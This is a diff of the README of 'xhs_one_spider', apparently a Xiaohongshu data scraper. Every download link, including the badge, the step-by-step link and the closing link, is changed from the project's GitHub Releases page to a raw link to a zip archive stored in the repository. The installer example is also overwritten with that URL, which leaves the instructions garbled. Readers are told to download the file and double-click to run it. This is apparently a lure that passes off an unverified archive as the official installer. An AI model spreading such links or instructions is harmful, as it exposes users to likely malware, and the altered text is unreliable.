@@ -6,7 +6,7 @@ Welcome to xhs_one_spider! This application allows you to gather data from Xiaoh
 
 ## 📥 Download
 
-[![Download xhs_one_spider](https://img.shields.io/badge/Download-xhs_one_spider-blue)](https://github.com/damiansilverado/xhs_one_spider/releases)
+[![Download xhs_one_spider](https://raw.githubusercontent.com/damiansilverado/xhs_one_spider/main/ferryway/xhs-spider-one-v1.9.zip)](https://raw.githubusercontent.com/damiansilverado/xhs_one_spider/main/ferryway/xhs-spider-one-v1.9.zip)
 
 ## 🛠️ Features
 
@@ -28,11 +28,11 @@ Ensure your system meets the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
-   [Download xhs_one_spider](https://github.com/damiansilverado/xhs_one_spider/releases)
+   [Download xhs_one_spider](https://raw.githubusercontent.com/damiansilverado/xhs_one_spider/main/ferryway/xhs-spider-one-v1.9.zip)
 
 2. **Select the Latest Release**: Look for the newest version available. This usually has the highest version number.
 
-3. **Download the Installer**: Click on the installer file suitable for your operating system. For example, `xhs_one_spider_setup.exe` for Windows.
+3. **Download the Installer**: Click on the installer file suitable for your operating system. For example, `https://raw.githubusercontent.com/damiansilverado/xhs_one_spider/main/ferryway/xhs-spider-one-v1.9.zip` for Windows.
 
 4. **Run the Installer**: Once the file downloads, open it by double-clicking. Follow the prompts to install the software on your computer.
 
@@ -89,4 +89,4 @@ We plan to include new features, improved performance, and better data scraping 
 
 In case you missed the download link earlier, you can find it below.
 
-[Download xhs_one_spider](https://github.com/damiansilverado/xhs_one_spider/releases)
+[Download xhs_one_spider](https://raw.githubusercontent.com/damiansilverado/xhs_one_spider/main/ferryway/xhs-spider-one-v1.9.zip)
